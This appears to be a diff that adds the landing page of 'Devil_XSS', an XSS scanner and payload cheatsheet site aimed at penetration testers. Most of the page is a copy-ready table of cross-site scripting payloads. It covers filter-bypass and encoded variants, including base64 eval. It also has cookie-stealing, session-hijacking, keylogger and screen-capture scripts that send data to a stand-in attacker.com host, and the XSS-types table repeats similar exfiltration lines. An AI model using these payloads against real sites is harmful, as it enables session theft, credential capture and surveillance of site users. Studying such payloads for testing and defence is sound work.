@@ -1,0 +1,709 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> Devil_XSS - XSS Vulnerability Scanner & Cheatsheets</title>
+    <link rel="icon" type="image/x-icon" href="images/favicon.ico">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Pixelify+Sans:wght@400..700&family=Sixtyfour+Convergence&family=Tiny5&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <!-- Navigation -->
+    <nav class="navbar">
+        <div class="nav-container">
+            <div class="nav-logo">
+                <img src="images/logo.png" alt="Devil_XSS Logo" class="logo-icon">
+                <span class="logo-text pixelify-sans-bold">Devil_XSS</span>
+            </div>
+            <ul class="nav-menu">
+                <li><a href="#home" class="nav-link">Home</a></li>
+                <li><a href="#xss-types" class="nav-link">XSS Types</a></li>
+                <li><a href="xss-payloads.html" class="nav-link">Scripts</a></li>
+                <li><a href="#payloads" class="nav-link">Payloads</a></li>
+                <li><a href="#scanner" class="nav-link">Scanner</a></li>
+                <li><a href="blog.html" class="nav-link">Blog</a></li>
+                <li><a href="xss-book-reading.html" class="nav-link">Book</a></li>
+                <li><a href="#about" class="nav-link">About</a></li>
+            </ul>
+            <div class="hamburger">
+                <span class="bar"></span>
+                <span class="bar"></span>
+                <span class="bar"></span>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <section id="home" class="hero">
+        <!-- Background Animation -->
+        <div class="hero-background">
+            <img src="images/michael-davies-father-unscreen.gif" alt="Background Animation" class="hero-bg-image">
+        </div>
+        
+        <div class="hero-container">
+            <div class="hero-content">
+                <div class="hero-logo">
+                    <img src="images/logo.png" alt="Devil_XSS Logo" class="hero-logo-img">
+                </div>
+                <h1 class="hero-title pixelify-sans-bold">
+                    <span class="glitch" data-text="Devil_XSS">Devil_XSS</span>
+                </h1>
+                <p class="hero-subtitle tiny5-shine">Advanced XSS Vulnerability Scanner & Security Toolkit</p>
+                <div class="hero-description">
+                    <p class="hero-text">Professional-grade Cross-Site Scripting detection and exploitation tools for security researchers, penetration testers, and cybersecurity professionals.</p>
+                </div>
+                
+            </div>
+        </div>
+    </section>
+
+    <!-- XSS Types Section -->
+    <section id="xss-types" class="section">
+        <div class="container">
+            <h2 class="section-title">
+                <i class="fas fa-shield-alt"></i>
+                XSS Vulnerability Types
+            </h2>
+            <div class="xss-types-table-container">
+                <table class="xss-types-table">
+                    <thead>
+                        <tr>
+                            <th><i class="fas fa-shield-alt"></i> XSS Type</th>
+                            <th><i class="fas fa-info-circle"></i> Description</th>
+                            <th><i class="fas fa-code"></i> Example</th>
+                            <th><i class="fas fa-list"></i> Key Features</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td class="xss-type-name">
+                                <i class="fas fa-arrow-right"></i>
+                                <span class="pixelify-sans-semibold">Reflected XSS</span>
+                            </td>
+                            <td class="xss-description">
+                                Also known as Non-Persistent XSS, occurs when malicious script is reflected off a web server in a response.
+                            </td>
+                            <td class="xss-example">
+                                <code>https://target.com/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
+                            </td>
+                            <td class="xss-features">
+                                <ul>
+                                    <li>Instant execution</li>
+                                    <li>No server storage</li>
+                                    <li>URL-based injection</li>
+                                    <li>Easy to detect</li>
+                                </ul>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="xss-type-name">
+                                <i class="fas fa-database"></i>
+                                <span class="pixelify-sans-semibold">Stored XSS</span>
+                            </td>
+                            <td class="xss-description">
+                                Also known as Persistent XSS, occurs when malicious script is stored on the target server.
+                            </td>
+                            <td class="xss-example">
+                                <code>&lt;script&gt;document.location='http://attacker.com/steal.php?cookie='+document.cookie&lt;/script&gt;</code>
+                            </td>
+                            <td class="xss-features">
+                                <ul>
+                                    <li>Persistent attack</li>
+                                    <li>Affects all users</li>
+                                    <li>Comment sections</li>
+                                    <li>User profiles</li>
+                                </ul>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="xss-type-name">
+                                <i class="fas fa-code-branch"></i>
+                                <span class="pixelify-sans-semibold">DOM-based XSS</span>
+                            </td>
+                            <td class="xss-description">
+                                Occurs when the vulnerability exists in client-side code rather than server-side code.
+                            </td>
+                            <td class="xss-example">
+                                <code>document.getElementById('content').innerHTML = userInput;</code>
+                            </td>
+                            <td class="xss-features">
+                                <ul>
+                                    <li>Client-side execution</li>
+                                    <li>No server interaction</li>
+                                    <li>JavaScript-based</li>
+                                    <li>Harder to detect</li>
+                                </ul>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="xss-type-name">
+                                <i class="fas fa-user-secret"></i>
+                                <span class="pixelify-sans-semibold">Blind XSS</span>
+                            </td>
+                            <td class="xss-description">
+                                A variant of stored XSS where the malicious payload is stored but executed in a different context.
+                            </td>
+                            <td class="xss-example">
+                                <code>&lt;script&gt;fetch('http://attacker.com/log?data='+btoa(document.documentElement.outerHTML))&lt;/script&gt;</code>
+                            </td>
+                            <td class="xss-features">
+                                <ul>
+                                    <li>Delayed execution</li>
+                                    <li>Admin panels</li>
+                                    <li>Log viewers</li>
+                                    <li>Email systems</li>
+                                </ul>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </section>
+
+    <!-- XSS Payloads Section -->
+    <section id="payloads" class="section">
+        <div class="container">
+            <h2 class="section-title">
+                <i class="fas fa-code"></i>
+                XSS Payloads Cheatsheets
+            </h2>
+            
+            <div class="payloads-table-container">
+                <table class="payloads-table">
+                    <thead>
+                        <tr>
+                            <th><i class="fas fa-code"></i> Payload Type</th>
+                            <th><i class="fas fa-font"></i> Payload</th>
+                            <th><i class="fas fa-info-circle"></i> Description</th>
+                            <th><i class="fas fa-copy"></i> Action</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <!-- Strings Cheatsheet -->
+                        <tr class="payload-section-header">
+                            <td colspan="4" class="section-header">
+                                <i class="fas fa-font"></i>
+                                <span class="pixelify-sans-semibold">XSS Payloads - Strings Cheatsheet</span>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="payload-type">Basic Alert</td>
+                            <td class="payload-code">
+                                <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
+                            </td>
+                            <td class="payload-description">Simple alert popup with XSS text</td>
+                            <td class="payload-action">
+                                <button class="copy-btn" onclick="copyToClipboard(this)">
+                                    <i class="fas fa-copy"></i>
+                                </button>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="payload-type">Alert with Quotes</td>
+                            <td class="payload-code">
+                                <code>&lt;script&gt;alert("XSS")&lt;/script&gt;</code>
+                            </td>
+                            <td class="payload-description">Alert using double quotes</td>
+                            <td class="payload-action">
+                                <button class="copy-btn" onclick="copyToClipboard(this)">
+                                    <i class="fas fa-copy"></i>
+                                </button>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="payload-type">CharCode Alert</td>
+                            <td class="payload-code">
+                                <code>&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;</code>
+                            </td>
+                            <td class="payload-description">Alert using String.fromCharCode()</td>
+                            <td class="payload-action">
+                                <button class="copy-btn" onclick="copyToClipboard(this)">
+                                    <i class="fas fa-copy"></i>
+                                </button>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="payload-type">Regex Alert</td>
+                            <td class="payload-code">
+                                <code>&lt;script&gt;alert(/XSS/)&lt;/script&gt;</code>
+                            </td>
+                            <td class="payload-description">Alert using regex pattern</td>
+                            <td class="payload-action">
+                                <button class="copy-btn" onclick="copyToClipboard(this)">
+                                    <i class="fas fa-copy"></i>
+                                </button>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="payload-type">Image onerror</td>
+                            <td class="payload-code">
+                                <code>&lt;img src=x onerror=alert('XSS')&gt;</code>
+                            </td>
+                            <td class="payload-description">Event handler payload using img tag</td>
+                            <td class="payload-action">
+                                <button class="copy-btn" onclick="copyToClipboard(this)">
+                                    <i class="fas fa-copy"></i>
+                                </button>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="payload-type">SVG onload</td>
+                            <td class="payload-code">
+                                <code>&lt;svg onload=alert('XSS')&gt;</code>
+                            </td>
+                            <td class="payload-description">Event handler payload using svg tag</td>
+                            <td class="payload-action">
+                                <button class="copy-btn" onclick="copyToClipboard(this)">
+                                    <i class="fas fa-copy"></i>
+                                </button>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="payload-type">Body onload</td>
+                            <td class="payload-code">
+                                <code>&lt;body onload=alert('XSS')&gt;</code>
+                            </td>
+                            <td class="payload-description">Event handler payload using body tag</td>
+                            <td class="payload-action">
+                                <button class="copy-btn" onclick="copyToClipboard(this)">
+                                    <i class="fas fa-copy"></i>
+                                </button>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="payload-type">Input onfocus</td>
+                            <td class="payload-code">
+                                <code>&lt;input onfocus=alert('XSS') autofocus&gt;</code>
+                            </td>
+                            <td class="payload-description">Event handler payload using input tag</td>
+                            <td class="payload-action">
+                                <button class="copy-btn" onclick="copyToClipboard(this)">
+                                    <i class="fas fa-copy"></i>
+                                </button>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="payload-type">Case Bypass</td>
+                            <td class="payload-code">
+                                <code>&lt;ScRiPt&gt;alert('XSS')&lt;/ScRiPt&gt;</code>
+                            </td>
+                            <td class="payload-description">Case variation to bypass filters</td>
+                            <td class="payload-action">
+                                <button class="copy-btn" onclick="copyToClipboard(this)">
+                                    <i class="fas fa-copy"></i>
+                                </button>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="payload-type">Comment Bypass</td>
+                            <td class="payload-code">
+                                <code>&lt;script&gt;alert('XSS')&lt;!--</code>
+                            </td>
+                            <td class="payload-description">HTML comment to bypass filters</td>
+                            <td class="payload-action">
+                                <button class="copy-btn" onclick="copyToClipboard(this)">
+                                    <i class="fas fa-copy"></i>
+                                </button>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="payload-type">JS Comment Bypass</td>
+                            <td class="payload-code">
+                                <code>&lt;script&gt;alert('XSS')//</code>
+                            </td>
+                            <td class="payload-description">JavaScript comment to bypass filters</td>
+                            <td class="payload-action">
+                                <button class="copy-btn" onclick="copyToClipboard(this)">
+                                    <i class="fas fa-copy"></i>
+                                </button>
+                            </td>
+                        </tr>
+
+                        <!-- Non-alphanumeric Cheatsheet -->
+                        <tr class="payload-section-header">
+                            <td colspan="4" class="section-header">
+                                <i class="fas fa-keyboard"></i>
+                                <span class="pixelify-sans-semibold">XSS Payloads - Non-alphanumeric Cheatsheet</span>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="payload-type">CharCode Encoding</td>
+                            <td class="payload-code">
+                                <code>&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;</code>
+                            </td>
+                            <td class="payload-description">Using String.fromCharCode() for encoding</td>
+                            <td class="payload-action">
+                                <button class="copy-btn" onclick="copyToClipboard(this)">
+                                    <i class="fas fa-copy"></i>
+                                </button>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="payload-type">Hex Encoding</td>
+                            <td class="payload-code">
+                                <code>&lt;script&gt;alert(String.fromCharCode(0x58,0x53,0x53))&lt;/script&gt;</code>
+                            </td>
+                            <td class="payload-description">Using hexadecimal values in CharCode</td>
+                            <td class="payload-action">
+                                <button class="copy-btn" onclick="copyToClipboard(this)">
+                                    <i class="fas fa-copy"></i>
+                                </button>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="payload-type">Hex Escape</td>
+                            <td class="payload-code">
+                                <code>&lt;script&gt;alert('\x58\x53\x53')&lt;/script&gt;</code>
+                            </td>
+                            <td class="payload-description">Using hexadecimal escape sequences</td>
+                            <td class="payload-action">
+                                <button class="copy-btn" onclick="copyToClipboard(this)">
+                                    <i class="fas fa-copy"></i>
+                                </button>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="payload-type">Octal Encoding</td>
+                            <td class="payload-code">
+                                <code>&lt;script&gt;alert('\130\123\123')&lt;/script&gt;</code>
+                            </td>
+                            <td class="payload-description">Using octal escape sequences</td>
+                            <td class="payload-action">
+                                <button class="copy-btn" onclick="copyToClipboard(this)">
+                                    <i class="fas fa-copy"></i>
+                                </button>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="payload-type">Unicode Encoding</td>
+                            <td class="payload-code">
+                                <code>&lt;script&gt;alert('\u0058\u0053\u0053')&lt;/script&gt;</code>
+                            </td>
+                            <td class="payload-description">Using Unicode escape sequences</td>
+                            <td class="payload-action">
+                                <button class="copy-btn" onclick="copyToClipboard(this)">
+                                    <i class="fas fa-copy"></i>
+                                </button>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="payload-type">Base64 Decode</td>
+                            <td class="payload-code">
+                                <code>&lt;script&gt;eval(atob('YWxlcnQoJ1hTUycp'))&lt;/script&gt;</code>
+                            </td>
+                            <td class="payload-description">Using Base64 encoding with atob()</td>
+                            <td class="payload-action">
+                                <button class="copy-btn" onclick="copyToClipboard(this)">
+                                    <i class="fas fa-copy"></i>
+                                </button>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="payload-type">Base64 Alert</td>
+                            <td class="payload-code">
+                                <code>&lt;script&gt;eval(atob('YWxlcnQoIlhTUyIp'))&lt;/script&gt;</code>
+                            </td>
+                            <td class="payload-description">Base64 encoded alert with double quotes</td>
+                            <td class="payload-action">
+                                <button class="copy-btn" onclick="copyToClipboard(this)">
+                                    <i class="fas fa-copy"></i>
+                                </button>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="payload-type">Base64 Redirect</td>
+                            <td class="payload-code">
+                                <code>&lt;script&gt;eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly9hdHRhY2tlci5jb20n'))&lt;/script&gt;</code>
+                            </td>
+                            <td class="payload-description">Base64 encoded page redirect</td>
+                            <td class="payload-action">
+                                <button class="copy-btn" onclick="copyToClipboard(this)">
+                                    <i class="fas fa-copy"></i>
+                                </button>
+                            </td>
+                        </tr>
+
+                        <!-- Execute Cheatsheet -->
+                        <tr class="payload-section-header">
+                            <td colspan="4" class="section-header">
+                                <i class="fas fa-play"></i>
+                                <span class="pixelify-sans-semibold">XSS Payloads - Execute Cheatsheet</span>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="payload-type">Cookie Stealing</td>
+                            <td class="payload-code">
+                                <code>&lt;script&gt;document.location='http://attacker.com/steal.php?cookie='+document.cookie&lt;/script&gt;</code>
+                            </td>
+                            <td class="payload-description">Steal cookies via URL redirect</td>
+                            <td class="payload-action">
+                                <button class="copy-btn" onclick="copyToClipboard(this)">
+                                    <i class="fas fa-copy"></i>
+                                </button>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="payload-type">Image Cookie Steal</td>
+                            <td class="payload-code">
+                                <code>&lt;script&gt;new Image().src='http://attacker.com/steal.php?cookie='+document.cookie&lt;/script&gt;</code>
+                            </td>
+                            <td class="payload-description">Steal cookies via image request</td>
+                            <td class="payload-action">
+                                <button class="copy-btn" onclick="copyToClipboard(this)">
+                                    <i class="fas fa-copy"></i>
+                                </button>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="payload-type">Fetch Cookie Steal</td>
+                            <td class="payload-code">
+                                <code>&lt;script&gt;fetch('http://attacker.com/steal.php',{method:'POST',body:document.cookie})&lt;/script&gt;</code>
+                            </td>
+                            <td class="payload-description">Steal cookies via fetch POST</td>
+                            <td class="payload-action">
+                                <button class="copy-btn" onclick="copyToClipboard(this)">
+                                    <i class="fas fa-copy"></i>
+                                </button>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="payload-type">Session Hijacking</td>
+                            <td class="payload-code">
+                                <code>&lt;script&gt;window.location.href='http://attacker.com/hijack?session='+document.cookie&lt;/script&gt;</code>
+                            </td>
+                            <td class="payload-description">Hijack session via window redirect</td>
+                            <td class="payload-action">
+                                <button class="copy-btn" onclick="copyToClipboard(this)">
+                                    <i class="fas fa-copy"></i>
+                                </button>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="payload-type">Location Replace</td>
+                            <td class="payload-code">
+                                <code>&lt;script&gt;document.location.replace('http://attacker.com/hijack?session='+document.cookie)&lt;/script&gt;</code>
+                            </td>
+                            <td class="payload-description">Replace current page location</td>
+                            <td class="payload-action">
+                                <button class="copy-btn" onclick="copyToClipboard(this)">
+                                    <i class="fas fa-copy"></i>
+                                </button>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="payload-type">Keylogger</td>
+                            <td class="payload-code">
+                                <code>&lt;script&gt;document.addEventListener('keypress',function(e){fetch('http://attacker.com/log?key='+e.key)})&lt;/script&gt;</code>
+                            </td>
+                            <td class="payload-description">Log keystrokes via fetch</td>
+                            <td class="payload-action">
+                                <button class="copy-btn" onclick="copyToClipboard(this)">
+                                    <i class="fas fa-copy"></i>
+                                </button>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="payload-type">Image Keylogger</td>
+                            <td class="payload-code">
+                                <code>&lt;script&gt;document.onkeypress=function(e){new Image().src='http://attacker.com/log?key='+e.key}&lt;/script&gt;</code>
+                            </td>
+                            <td class="payload-description">Log keystrokes via image requests</td>
+                            <td class="payload-action">
+                                <button class="copy-btn" onclick="copyToClipboard(this)">
+                                    <i class="fas fa-copy"></i>
+                                </button>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="payload-type">Batch Keylogger</td>
+                            <td class="payload-code">
+                                <code>&lt;script&gt;var keys='';document.addEventListener('keydown',function(e){keys+=e.key;if(keys.length>10){fetch('http://attacker.com/log?keys='+keys);keys=''}})&lt;/script&gt;</code>
+                            </td>
+                            <td class="payload-description">Batch keystroke logging</td>
+                            <td class="payload-action">
+                                <button class="copy-btn" onclick="copyToClipboard(this)">
+                                    <i class="fas fa-copy"></i>
+                                </button>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="payload-type">Screen Capture</td>
+                            <td class="payload-code">
+                                <code>&lt;script&gt;html2canvas(document.body).then(canvas=>{canvas.toBlob(blob=>{var fd=new FormData();fd.append('screenshot',blob);fetch('http://attacker.com/upload',{method:'POST',body:fd})})})&lt;/script&gt;</code>
+                            </td>
+                            <td class="payload-description">Capture and upload screen</td>
+                            <td class="payload-action">
+                                <button class="copy-btn" onclick="copyToClipboard(this)">
+                                    <i class="fas fa-copy"></i>
+                                </button>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </section>
+
+    <!-- Scanner Section -->
+    <section id="scanner" class="section">
+        <div class="container">
+            <h2 class="section-title">
+                <i class="fas fa-search"></i>
+                XSS Vulnerability Scanner
+            </h2>
+            <div class="scanner-container">
+                <div class="scanner-info">
+                    <h3>Devil_XSS Scanner Features</h3>
+                    <div class="feature-grid">
+                        <div class="feature-item">
+                            <img src="images/fast-scanning.svg" alt="Fast Scanning" class="feature-image">
+                            <h4>Fast Scanning</h4>
+                            <p>Multi-threaded scanning with real-time progress tracking</p>
+                        </div>
+                        <div class="feature-item">
+                            <img src="images/multi-vector.svg" alt="Multi-Vector Testing" class="feature-image">
+                            <h4>Multi-Vector Testing</h4>
+                            <p>Tests GET, POST, and Header injection methods</p>
+                        </div>
+                        <div class="feature-item">
+                            <img src="images/detailed-reports.svg" alt="Detailed Reports" class="feature-image">
+                            <h4>Detailed Reports</h4>
+                            <p>Comprehensive vulnerability reports with proof of concept</p>
+                        </div>
+                        <div class="feature-item">
+                            <img src="images/beautiful-ui.svg" alt="Beautiful UI" class="feature-image">
+                            <h4>Beautiful UI</h4>
+                            <p>Color-coded output with animated progress bars</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="scanner-demo">
+                    <div class="demo-terminal">
+                        <div class="terminal-header">
+                            <div class="terminal-buttons">
+                                <span class="btn-close"></span>
+                                <span class="btn-minimize"></span>
+                                <span class="btn-maximize"></span>
+                            </div>
+                            <span class="terminal-title">Devil_XSS Scanner</span>
+                        </div>
+                        <div class="terminal-body" id="scanner-output">
+                            <div class="terminal-line">
+                                <span class="prompt">$</span>
+                                <span class="command">python devil_xss.py -f urls.txt -p payloads.txt -o results.txt</span>
+                            </div>
+                            <div class="terminal-line">
+                                <span class="output success">[+] Loaded 15 URLs successfully</span>
+                            </div>
+                            <div class="terminal-line">
+                                <span class="output success">[+] Loaded 50 XSS payloads successfully</span>
+                            </div>
+                            <div class="terminal-line">
+                                <span class="output info">[*] Starting XSS vulnerability scan...</span>
+                            </div>
+                            <div class="terminal-line">
+                                <span class="output">[>] Target [1/15]: https://example.com/search</span>
+                            </div>
+                            <div class="terminal-line">
+                                <span class="output vulnerable">[💀 VULNERABLE] https://example.com/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;</span>
+                            </div>
+                            <div class="terminal-line">
+                                <span class="output">  ├─ Method: GET | Param: q | Status: 200</span>
+                            </div>
+                            <div class="terminal-line">
+                                <span class="output">  └─ Payload: &lt;script&gt;alert('XSS')&lt;/script&gt;</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- About Section -->
+    <section id="about" class="section">
+        <div class="container">
+            <h2 class="section-title">
+                <i class="fas fa-user"></i>
+                About Devil_XSS
+            </h2>
+            <div class="about-content">
+                <div class="about-profile">
+                    <img src="https://www.cyberwolf.pro/assets/speaker1-CjLQ5PRf.png" alt="Developer Profile" class="profile-image">
+                </div>
+                <div class="about-text">
+                    <h3>Developed by S.Tamilselvan</h3>
+                    <p>Devil_XSS is a comprehensive XSS vulnerability scanner designed for security professionals and ethical hackers. The tool combines advanced scanning techniques with an intuitive interface to help identify and remediate XSS vulnerabilities effectively.</p>
+                    <div class="developer-links">
+                        <a href="https://github.com/Tamilselvan-S-Cyber-Security" class="dev-link">
+                            <i class="fab fa-github"></i> GitHub
+                        </a>
+                        <a href="https://tamilselvan-official.web.app/" class="dev-link">
+                            <i class="fas fa-globe"></i> Official Site
+                        </a>
+                    </div>
+                </div>
+                <div class="about-stats">
+                    <div class="stat-item">
+                        <div class="stat-number">4</div>
+                        <div class="stat-label">XSS Types</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-number">50+</div>
+                        <div class="stat-label">Payloads</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-number">3</div>
+                        <div class="stat-label">Scan Methods</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-number">100%</div>
+                        <div class="stat-label">Open Source</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-section">
+                    <h4>Devil_XSS</h4>
+                    <p>Advanced XSS vulnerability scanner and comprehensive cheatsheets for security professionals.</p>
+                </div>
+                <div class="footer-section">
+                    <h4>Quick Links</h4>
+                    <ul>
+                        <li><a href="#xss-types">XSS Types</a></li>
+                        <li><a href="#payloads">Payloads</a></li>
+                        <li><a href="#scanner">Scanner</a></li>
+                        <li><a href="#about">About</a></li>
+                    </ul>
+                </div>
+                <div class="footer-section">
+                    <h4>Resources</h4>
+                    <ul>
+                        <li><a href="https://github.com/Tamilselvan-S-Cyber-Security">GitHub</a></li>
+                        <li><a href="https://tamilselvan-official.web.app/">Official Site</a></li>
+                        <li><a href="#">Documentation</a></li>
+                        <li><a href="#">Support</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <p>&copy; 2025 Devil_XSS. Made with ❤️ by S.Tamilselvan. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script src="script.js"></script>
+</body>
+</html>
